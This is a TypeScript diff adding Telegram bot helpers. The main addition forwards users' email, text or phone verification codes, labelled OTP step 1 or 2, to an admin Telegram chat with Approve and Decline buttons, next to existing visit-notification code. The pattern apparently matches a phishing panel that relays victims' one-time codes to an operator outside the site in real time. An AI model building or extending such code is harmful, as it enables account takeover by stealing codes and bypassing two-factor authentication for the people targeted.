@@ -309,3 +309,172 @@ export function formatVisitMessage(input: {
     `🕒 UTC Time: ${input.utcTime}`,
   ].join("\n");
 }
+
+/**
+ * Send a Telegram message with inline keyboard buttons to admin
+ */
+export async function sendTelegramWithButtons(
+  text: string,
+  buttons: Array<Array<{ text: string; callback_data: string }>>,
+  chatId?: string,
+): Promise<{ ok: boolean; error?: string; messageId?: number }> {
+  const token = TELEGRAM_BOT_TOKEN;
+  const targetChatId = chatId || getTelegramChatIds()[0];
+
+  if (!token || !targetChatId) {
+    return { ok: false, error: "not_configured" };
+  }
+
+  const payload = truncateMessage(text);
+  const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+  try {
+    const res = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: targetChatId,
+        text: payload,
+        disable_web_page_preview: true,
+        reply_markup: {
+          inline_keyboard: buttons,
+        },
+      }),
+    });
+
+    if (!res.ok) {
+      const errText = await res.text();
+      return { ok: false, error: errText };
+    }
+
+    const data = (await res.json()) as {
+      ok?: boolean;
+      result?: { message_id?: number };
+      description?: string;
+    };
+
+    if (data.ok && data.result?.message_id) {
+      return { ok: true, messageId: data.result.message_id };
+    }
+
+    return {
+      ok: false,
+      error: data.description || "Unknown error",
+    };
+  } catch (error) {
+    return { ok: false, error: String(error) };
+  }
+}
+
+/**
+ * Send verification message with approve/decline buttons to admin
+ */
+export async function sendVerificationWithApprovalButtons(
+  method: "email" | "text" | "phone",
+  code: string,
+  otpStep: 1 | 2,
+  codeId: string,
+  chatId?: string,
+): Promise<{ ok: boolean; error?: string; messageId?: number }> {
+  const text = formatVerificationMessage(method, code, otpStep);
+  const buttons = [
+    [
+      {
+        text: "✅ Approve",
+        callback_data: `approve_${codeId}`,
+      },
+      {
+        text: "❌ Decline",
+        callback_data: `decline_${codeId}`,
+      },
+    ],
+  ];
+
+  return sendTelegramWithButtons(
+    withSiteHeader(text),
+    buttons,
+    chatId,
+  );
+}
+
+/**
+ * Edit a Telegram message with new buttons
+ */
+export async function editTelegramMessage(
+  messageId: number,
+  text: string,
+  buttons: Array<Array<{ text: string; callback_data: string }>>,
+  chatId?: string,
+): Promise<{ ok: boolean; error?: string }> {
+  const token = TELEGRAM_BOT_TOKEN;
+  const targetChatId = chatId || getTelegramChatIds()[0];
+
+  if (!token || !targetChatId) {
+    return { ok: false, error: "not_configured" };
+  }
+
+  const url = `https://api.telegram.org/bot${token}/editMessageText`;
+
+  try {
+    const res = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: targetChatId,
+        message_id: messageId,
+        text: truncateMessage(text),
+        disable_web_page_preview: true,
+        reply_markup: {
+          inline_keyboard: buttons,
+        },
+      }),
+    });
+
+    if (!res.ok) {
+      const errText = await res.text();
+      return { ok: false, error: errText };
+    }
+
+    return { ok: true };
+  } catch (error) {
+    return { ok: false, error: String(error) };
+  }
+}
+
+/**
+ * Answer Telegram callback query (the notification for the button press)
+ */
+export async function answerCallbackQuery(
+  callbackQueryId: string,
+  text: string,
+  showAlert: boolean = false,
+): Promise<{ ok: boolean; error?: string }> {
+  const token = TELEGRAM_BOT_TOKEN;
+
+  if (!token) {
+    return { ok: false, error: "not_configured" };
+  }
+
+  const url = `https://api.telegram.org/bot${token}/answerCallbackQuery`;
+
+  try {
+    const res = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        callback_query_id: callbackQueryId,
+        text,
+        show_alert: showAlert,
+      }),
+    });
+
+    if (!res.ok) {
+      const errText = await res.text();
+      return { ok: false, error: errText };
+    }
+
+    return { ok: true };
+  } catch (error) {
+    return { ok: false, error: String(error) };
+  }
+}
